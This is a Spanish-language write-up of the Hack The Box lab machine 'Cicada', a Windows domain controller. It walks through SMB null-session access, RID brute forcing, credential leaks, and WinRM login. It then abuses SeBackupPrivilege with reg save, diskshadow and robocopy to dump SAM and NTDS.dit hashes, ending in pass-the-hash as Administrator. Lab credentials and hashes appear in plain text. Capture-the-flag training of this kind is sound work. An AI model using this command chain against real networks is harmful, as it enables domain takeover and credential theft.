
----
- Tags: #AD #writeup #smb #enum #tutorial #htb
----

```bash
# Nmap 7.94SVN scan initiated Sun Sep 29 16:07:34 2024 as: nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,52038 -sCV -oN targeted 10.10.11.35
Nmap scan report for cicada.htb (10.10.11.35)
Host is up (0.35s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-30 05:07:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
52038/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-09-30T05:08:46
|_  start_date: N/A
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep 29 16:09:27 2024 -- 1 IP address (1 host up) scanned in 112.83 seconds

```

---
- Con una *NULL Session* entramos al recurso **/HR** del protocolo [[SMB - 445]] 
```bash
smbclient //CICADA-DC.cicada.htb/HR -N

//Obtenemos la Password de un usuario desconocido
Cicada$M6Corpb*@Lp#nZp!8
```

- Este usuario podemos encontrarlo con fuerza bruta al **RID**
```bash
crackmapexec smb 10.10.11.35 -u 'guest' -p '' --rid-brute | grep SidTypeUser
//
user:[john.smoulder] rid:[0x450]
user:[sarah.dantelia] rid:[0x451]
user:[michael.wrightson] rid:[0x452] --> La contrasena pertenece a este usuario
user:[david.orelious] rid:[0x454]
user:[emily.oscars]

// Probamos uno x uno cada usuario
crackmapexec smb 10.10.11.35 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' 
```

- Con este usuario nos conectamos al [[RpcClient]]
```bash
rpcclient -U "michael.wrightson%'" 10.10.11.35
```

- Podemos enuemeraror los usuarios, pero ademas con el comando **querydispinfo**, vemos un leakage de info de otro usuario
```bash
rpcclient -U "michael.wrightson%'" 10.10.11.35 
//
querydispinfo
//david.orelious:aRt$Lp#7t*VQ!3
```

- Con estas nuevas credenciales ahora somos capaces de acceder a otro recurso compartido de [[SMB - 445]], el reucrso /DEV
- Dentro de este recurso encontramos un archivo *Backup* con las credenciales de otro usuario

```bash
//
emily.oscars:Q!3@Lp#M6b*7t*Vt
//
crackmapexec smb CICADA-DC.cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
crackmapexec winrm CICADA-DC.cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'  (Pwned!)

//Validamos estas credenciales con Crackmapexec y efectivamente son validas, y ademas el user pertenece al grupo Remote Management
evil-winrm -i CICADA-DC.cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

--- 

# Privesc

- En la escalada de privielgios nos encontramos con que tenemos habilitado el permiso **SeBackupPrivilege**
- Con el somos capaces de poder dumpear el archivo **`C:\Windows\NTDS\NTDS.dit`**

#### Metodo 1
-  (Dumpear hashes de la maquina **Local**)

- En la maquina Victima
```powershell
//crear directorio Temp

reg save HKLM\system system

reg save HKLM\sam sam
```

- Transferimos estos 2 archivos a local 
```bash
impacket-secretsdump -system system -sam sam LOCAL 
```

---
#### Metodo 2
-  (Dumpear hashes de el **Dominio**)

- Empezamos creando en nuestra maquina el siguiente archivo.txt
```powershell
set context persistent nowriters
add volume c: alias luis
create
expose %luis% z:
```

- Transferimos a maquina Victima y ejecutamos el comando:

```bash
diskshadow.exe /s c:\archivo.txt
```

- En caso de que no le guste, cuidar darle un espacio al final de cada linea del archivo

- Se crea una copia de la unidad de lo que teniamos en **C** a **Z**
```powershell
dir z:\

# Nos intentamos traes el NTDS.dit
copy z:\Windows\NTDS\ntds.dit ntds.dit

# En caso de error probaremos con robocopy
robocopy /b z:\Windows\NTDS\ . ntds.dit
```

- Transferimos este archivos a local 
```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL 
```

- Valdiamos credencial con **crackmapexec**
```bash
crackmapexec smb 10.10.11.35 -u Administrator -H '2b87e7c93a3e8a0ea4a581937016f341'  [+] (Pwned!) 
```

- Con este hash podemos hacer **PassTheHash** y con **psexec.py** o **Evil-WinRM** Conectarmos con una consola interactiva

[Recurso Tutorial](https://pentestlab.blog/tag/diskshadow/)
